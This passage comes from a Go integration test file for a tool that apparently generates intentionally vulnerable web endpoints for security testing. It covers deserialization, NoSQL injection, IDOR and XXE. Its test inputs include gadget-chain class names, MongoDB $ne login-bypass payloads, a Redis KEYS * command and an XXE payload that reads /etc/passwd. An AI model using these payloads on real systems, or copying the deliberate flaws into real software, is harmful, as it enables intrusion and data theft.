	if data["format"] != "java" {
		t.Errorf("Expected format 'java', got '%v'", data["format"])
	}

	if data["detected"] != true {
		t.Errorf("Expected detected=true")
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true for Java gadget chain")
	}
}

func TestIntegration_InsecureDeserialization_PHPPayload(t *testing.T) {
	configContent := `
app:
  name: "Deserialization PHP Test"
  port: 18096

endpoints:
  - path: "/api/import"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: insecure_deserialization
        placement: form_field
        param: object
        config:
          format: php
          filter: none
          show_decoded: true
          emulate_execution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with PHP serialization (URL encoded for form submission)
	phpPayload := `O:8:"stdClass":1:{s:4:"test";s:5:"value";}`
	body := strings.NewReader("object=" + phpPayload)
	req := httptest.NewRequest("POST", "/api/import", body)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	// Accept 200 or check for specific response
	if w.Code != http.StatusOK && w.Code != http.StatusInternalServerError {
		t.Errorf("Expected status 200 or 500, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	// Check if response has data or error
	if data, ok := response["data"].(map[string]interface{}); ok {
		if data["format"] != "php" {
			t.Errorf("Expected format 'php', got '%v'", data["format"])
		}

		if data["detected"] != true {
			t.Errorf("Expected detected=true")
		}
	} else if response["error"] != nil {
		// Form parsing may fail - this is acceptable for the test
		t.Logf("Got error response: %v", response["error"])
	}
}

func TestIntegration_InsecureDeserialization_JSONPayload(t *testing.T) {
	configContent := `
app:
  name: "Deserialization JSON Test"
  port: 18097

endpoints:
  - path: "/api/process"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: insecure_deserialization
        placement: json_field
        param: serialized_data
        config:
          format: auto
          filter: none
          emulate_execution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with Java payload in JSON
	jsonBody := `{"serialized_data": "org.springframework.beans.factory.ObjectFactory"}`
	req := httptest.NewRequest("POST", "/api/process", strings.NewReader(jsonBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	// The response could have data directly or nested
	if data, ok := response["data"].(map[string]interface{}); ok {
		if data["detected"] != true {
			t.Logf("Response data: %+v", data)
			// Check if format was detected
			if data["format"] != "" {
				t.Logf("Format detected: %v", data["format"])
			}
		}
	} else {
		t.Logf("Full response: %+v", response)
	}
}

func TestIntegration_InsecureDeserialization_WithFilter(t *testing.T) {
	configContent := `
app:
  name: "Deserialization Filter Test"
  port: 18098

endpoints:
  - path: "/safe/deserialize"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: insecure_deserialization
        placement: query_param
        param: data
        config:
          format: auto
          filter: basic_class
          show_decoded: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with blocked class
	blockedPayload := "org.apache.commons.collections.Transformer"
	req := httptest.NewRequest("GET", "/safe/deserialize?data="+blockedPayload, nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["blocked"] != true {
		t.Errorf("Expected blocked=true for dangerous class")
	}
}

func TestIntegration_InsecureDeserialization_Cookie(t *testing.T) {
	configContent := `
app:
  name: "Deserialization Cookie Test"
  port: 18099

endpoints:
  - path: "/session"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: insecure_deserialization
        placement: cookie
        param: session_data
        config:
          format: auto
          filter: none
          emulate_execution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with cookie - use Java payload (no newlines)
	req := httptest.NewRequest("GET", "/session", nil)
	req.AddCookie(&http.Cookie{
		Name:  "session_data",
		Value: "org.apache.commons.collections.functors.InvokerTransformer",
	})
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["format"] != "java" {
		t.Errorf("Expected format 'java', got '%v'", data["format"])
	}
}

func TestIntegration_InsecureDeserialization_DotNet(t *testing.T) {
	configContent := `
app:
  name: "Deserialization .NET Test"
  port: 18100

endpoints:
  - path: "/dotnet/process"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: insecure_deserialization
        placement: form_field
        param: viewstate
        config:
          format: auto
          filter: none
          emulate_execution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with .NET payload
	dotnetPayload := "System.Windows.Data.ObjectDataProvider"
	body := strings.NewReader("viewstate=" + dotnetPayload)
	req := httptest.NewRequest("POST", "/dotnet/process", body)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["format"] != "dotnet" {
		t.Errorf("Expected format 'dotnet', got '%v'", data["format"])
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true for .NET gadget chain")
	}
}

// =============================================================================
// Integration Test: NoSQL Injection Module
// =============================================================================

func TestIntegration_NoSQLInjection_MongoDB_QueryParam(t *testing.T) {
	configContent := `
app:
  name: "NoSQL MongoDB Test"
  port: 18101

endpoints:
  - path: "/api/users"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: nosql_injection
        placement: query_param
        param: filter
        config:
          database: mongodb
          collection: users
          operation: find
          filter: none
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with MongoDB operator injection
	req := httptest.NewRequest("GET", `/api/users?filter={"$ne":""}`, nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["database"] != "mongodb" {
		t.Errorf("Expected database 'mongodb', got '%v'", data["database"])
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true for $ne injection")
	}
}

func TestIntegration_NoSQLInjection_MongoDB_JSONField(t *testing.T) {
	configContent := `
app:
  name: "NoSQL MongoDB JSON Test"
  port: 18102

endpoints:
  - path: "/api/login"
    method: "POST"
    response_type: "json"
    vulnerabilities:
      - type: nosql_injection
        placement: json_field
        param: query
        config:
          database: mongodb
          collection: users
          operation: findOne
          filter: none
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with JSON field containing MongoDB injection
	jsonBody := `{"query": "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}"}`
	req := httptest.NewRequest("POST", "/api/login", strings.NewReader(jsonBody))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["database"] != "mongodb" {
		t.Errorf("Expected database 'mongodb', got '%v'", data["database"])
	}
}

func TestIntegration_NoSQLInjection_MongoDB_WithTemplate(t *testing.T) {
	configContent := `
app:
  name: "NoSQL MongoDB Template Test"
  port: 18103

endpoints:
  - path: "/api/user"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: nosql_injection
        placement: query_param
        param: username
        config:
          database: mongodb
          collection: users
          operation: findOne
          query_template: '{"username": "{input}"}'
          filter: none
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with clean input
	req := httptest.NewRequest("GET", "/api/user?username=admin", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["operation"] != "findOne" {
		t.Errorf("Expected operation 'findOne', got '%v'", data["operation"])
	}
}

func TestIntegration_NoSQLInjection_Redis_QueryParam(t *testing.T) {
	configContent := `
app:
  name: "NoSQL Redis Test"
  port: 18104

endpoints:
  - path: "/cache/get"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: nosql_injection
        placement: query_param
        param: key
        config:
          database: redis
          operation: get
          command_template: "GET {input}"
          filter: none
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with normal Redis key
	req := httptest.NewRequest("GET", "/cache/get?key=user:1", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["database"] != "redis" {
		t.Errorf("Expected database 'redis', got '%v'", data["database"])
	}
}

func TestIntegration_NoSQLInjection_Redis_Injection(t *testing.T) {
	configContent := `
app:
  name: "NoSQL Redis Injection Test"
  port: 18105

endpoints:
  - path: "/cache/query"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: nosql_injection
        placement: query_param
        param: cmd
        config:
          database: redis
          operation: eval
          filter: none
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with dangerous Redis command
	req := httptest.NewRequest("GET", "/cache/query?cmd=KEYS+*", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true for KEYS * command")
	}
}

func TestIntegration_NoSQLInjection_WithNoFilter(t *testing.T) {
	// Test that NoSQL injection works without filtering
	// Note: Filter functionality has been intentionally removed from this module
	configContent := `
app:
  name: "NoSQL No Filter Test"
  port: 18106

endpoints:
  - path: "/api/users"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: nosql_injection
        placement: query_param
        param: filter
        config:
          database: mongodb
          collection: users
          operation: find
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with $ operator - should be exploitable without filter
	req := httptest.NewRequest("GET", `/api/users?filter={"$ne":""}`, nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	// Without filters, the injection should be exploitable
	if data["exploitable"] != true {
		t.Errorf("Expected exploitable=true for $ operator without filter")
	}
}

func TestIntegration_NoSQLInjection_MongoDB_Cookie(t *testing.T) {
	configContent := `
app:
  name: "NoSQL Cookie Test"
  port: 18107

endpoints:
  - path: "/api/session"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: nosql_injection
        placement: cookie
        param: session_query
        config:
          database: mongodb
          collection: sessions
          operation: findOne
          filter: none
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with cookie containing injection
	req := httptest.NewRequest("GET", "/api/session", nil)
	req.AddCookie(&http.Cookie{
		Name:  "session_query",
		Value: `{"user_id": {"$ne": ""}}`,
	})
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["database"] != "mongodb" {
		t.Errorf("Expected database 'mongodb', got '%v'", data["database"])
	}
}

// =============================================================================
// Integration Test: IDOR Module
// =============================================================================

func TestIntegration_IDOR_NumericID_QueryParam(t *testing.T) {
	configContent := `
app:
  name: "IDOR Numeric Test"
  port: 18110

data:
  tables:
    users:
      columns:
        - id
        - username
        - email
        - ssn
      rows:
        - ["1", "admin", "admin@test.com", "123-45-6789"]
        - ["2", "john", "john@test.com", "987-65-4321"]
        - ["3", "jane", "jane@test.com", "456-78-9012"]

endpoints:
  - path: "/api/user"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: idor
        placement: query_param
        param: id
        config:
          variant: numeric
          query_template: "SELECT * FROM users WHERE id = {input}"
          access_control: none
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}
	defer b.Close()

	// Test accessing user 1's data (admin)
	req := httptest.NewRequest("GET", "/api/user?id=1", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	resource, ok := data["resource"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected resource object in response")
	}

	if resource["username"] != "admin" {
		t.Errorf("Expected username 'admin', got '%v'", resource["username"])
	}

	// Test IDOR - accessing user 2's data without authorization
	req2 := httptest.NewRequest("GET", "/api/user?id=2", nil)
	w2 := httptest.NewRecorder()
	srv.Router().ServeHTTP(w2, req2)

	if w2.Code != http.StatusOK {
		t.Errorf("Expected status 200 (IDOR vulnerability), got %d", w2.Code)
	}

	var response2 map[string]interface{}
	json.NewDecoder(w2.Body).Decode(&response2)

	data2, ok := response2["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	resource2, ok := data2["resource"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected resource object in response")
	}

	if resource2["username"] != "john" {
		t.Errorf("Expected username 'john' (IDOR success), got '%v'", resource2["username"])
	}

	// Verify we can see sensitive data (SSN)
	if resource2["ssn"] != "987-65-4321" {
		t.Errorf("Expected SSN '987-65-4321', got '%v'", resource2["ssn"])
	}
}

func TestIntegration_IDOR_PathParam(t *testing.T) {
	configContent := `
app:
  name: "IDOR Path Param Test"
  port: 18111

data:
  tables:
    documents:
      columns:
        - id
        - title
        - content
        - owner_id
      rows:
        - ["1", "Secret Report", "Confidential data here", "100"]
        - ["2", "Public Doc", "Public content", "101"]
        - ["3", "HR Records", "Salary information", "100"]

endpoints:
  - path: "/api/document/{id}"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: idor
        placement: path_param
        param: id
        config:
          variant: numeric
          query_template: "SELECT * FROM documents WHERE id = {input}"
          access_control: none
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}
	defer b.Close()

	// Access document 1
	req := httptest.NewRequest("GET", "/api/document/1", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	resource, ok := data["resource"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected resource object in response")
	}

	if resource["title"] != "Secret Report" {
		t.Errorf("Expected title 'Secret Report', got '%v'", resource["title"])
	}
}

func TestIntegration_IDOR_WeakHeaderAuth(t *testing.T) {
	configContent := `
app:
  name: "IDOR Weak Header Test"
  port: 18112

data:
  tables:
    profiles:
      columns:
        - id
        - user_id
        - bio
        - private_notes
      rows:
        - ["1", "100", "Admin profile", "Admin password: admin123"]
        - ["2", "101", "John's profile", "Bank account: 12345"]

endpoints:
  - path: "/api/profile"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: idor
        placement: query_param
        param: user_id
        config:
          variant: numeric
          query_template: "SELECT * FROM profiles WHERE user_id = {input}"
          access_control: weak_header
          show_errors: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}
	defer b.Close()

	// Test without X-User-ID header - should be blocked
	req := httptest.NewRequest("GET", "/api/profile?user_id=100", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("Expected status 403 without auth header, got %d", w.Code)
	}

	// Test with X-User-ID header (as user 101 accessing user 100's data)
	req2 := httptest.NewRequest("GET", "/api/profile?user_id=100", nil)
	req2.Header.Set("X-User-ID", "101") // User 101 trying to access user 100's profile
	w2 := httptest.NewRecorder()
	srv.Router().ServeHTTP(w2, req2)

	// Should succeed - IDOR vulnerability (weak auth doesn't check ownership)
	if w2.Code != http.StatusOK {
		t.Errorf("Expected status 200 (IDOR bypass), got %d", w2.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w2.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	resource, ok := data["resource"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected resource object in response")
	}

	// Verify we can see admin's private notes (IDOR success)
	if resource["private_notes"] != "Admin password: admin123" {
		t.Errorf("Expected admin's private notes, got '%v'", resource["private_notes"])
	}
}

func TestIntegration_IDOR_ResourceNotFound(t *testing.T) {
	configContent := `
app:
  name: "IDOR Not Found Test"
  port: 18113

data:
  tables:
    items:
      columns:
        - id
        - name
      rows:
        - ["1", "Item One"]

endpoints:
  - path: "/api/item"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: idor
        placement: query_param
        param: id
        config:
          variant: numeric
          query_template: "SELECT * FROM items WHERE id = {input}"
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}
	defer b.Close()

	// Request non-existent ID
	req := httptest.NewRequest("GET", "/api/item?id=999", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("Expected status 404 for non-existent resource, got %d", w.Code)
	}
}

func TestIntegration_IDOR_InvalidInput(t *testing.T) {
	configContent := `
app:
  name: "IDOR Invalid Input Test"
  port: 18114

data:
  tables:
    users:
      columns:
        - id
        - name
      rows:
        - ["1", "Test User"]

endpoints:
  - path: "/api/user"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: idor
        placement: query_param
        param: id
        config:
          variant: numeric
          query_template: "SELECT * FROM users WHERE id = {input}"
          show_errors: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}
	defer b.Close()

	// Test with non-numeric input for numeric variant
	req := httptest.NewRequest("GET", "/api/user?id=not-a-number", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected status 400 for invalid input, got %d", w.Code)
	}
}

func TestIntegration_IDOR_RoleBasedBypass(t *testing.T) {
	configContent := `
app:
  name: "IDOR Role Based Test"
  port: 18115

data:
  tables:
    admin_data:
      columns:
        - id
        - secret
        - admin_only
      rows:
        - ["1", "API_KEY_12345", "true"]
        - ["2", "DB_PASSWORD_xyz", "true"]

endpoints:
  - path: "/admin/secrets"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: idor
        placement: query_param
        param: id
        config:
          variant: numeric
          query_template: "SELECT * FROM admin_data WHERE id = {input}"
          access_control: role_based
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}
	defer b.Close()

	// Test as admin - should work
	req := httptest.NewRequest("GET", "/admin/secrets?id=1", nil)
	req.Header.Set("X-User-Role", "admin")
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200 for admin, got %d", w.Code)
	}

	// Test as regular user - should still work due to IDOR vulnerability
	req2 := httptest.NewRequest("GET", "/admin/secrets?id=1", nil)
	req2.Header.Set("X-User-Role", "user")
	w2 := httptest.NewRecorder()
	srv.Router().ServeHTTP(w2, req2)

	// IDOR vulnerability - regular user can access admin data
	if w2.Code != http.StatusOK {
		t.Errorf("Expected status 200 (IDOR vulnerability), got %d", w2.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w2.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	resource, ok := data["resource"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected resource object in response")
	}

	// Verify regular user can see admin secrets
	if resource["secret"] != "API_KEY_12345" {
		t.Errorf("Expected secret 'API_KEY_12345', got '%v'", resource["secret"])
	}
}

func TestIntegration_IDOR_UUIDVariant(t *testing.T) {
	configContent := `
app:
  name: "IDOR UUID Test"
  port: 18116

data:
  tables:
    orders:
      columns:
        - uuid
        - customer_name
        - total
        - credit_card
      rows:
        - ["550e8400-e29b-41d4-a716-446655440000", "Alice", "150.00", "4111-1111-1111-1111"]
        - ["6ba7b810-9dad-11d1-80b4-00c04fd430c8", "Bob", "250.00", "5500-0000-0000-0004"]

endpoints:
  - path: "/api/order"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: idor
        placement: query_param
        param: order_id
        config:
          variant: uuid
          query_template: "SELECT * FROM orders WHERE uuid = '{input}'"
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}
	defer b.Close()

	// Access Alice's order using UUID
	req := httptest.NewRequest("GET", "/api/order?order_id=550e8400-e29b-41d4-a716-446655440000", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

	if data["resource_type"] != "uuid_based" {
		t.Errorf("Expected resource_type 'uuid_based', got '%v'", data["resource_type"])
	}

	resource, ok := data["resource"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected resource object in response")
	}

	// Verify we can see sensitive credit card data
	if resource["credit_card"] != "4111-1111-1111-1111" {
		t.Errorf("Expected credit card data, got '%v'", resource["credit_card"])
	}
}

// =============================================================================
// Integration Test: XXE (XML External Entity) Module
// =============================================================================

func TestIntegration_XXE_QueryParam(t *testing.T) {
	configContent := `
app:
  name: "XXE Test"
  port: 18100

endpoints:
  - path: "/xml/parse"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: xxe
        placement: query_param
        param: data
        config:
          filter: none
          show_decoded: true
          emulate_resolution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with XXE file disclosure payload - use simpler payload for query param
	xxePayload := `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>test</foo>`
	req := httptest.NewRequest("GET", "/xml/parse", nil)
	q := req.URL.Query()
	q.Add("data", xxePayload)
	req.URL.RawQuery = q.Encode()
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
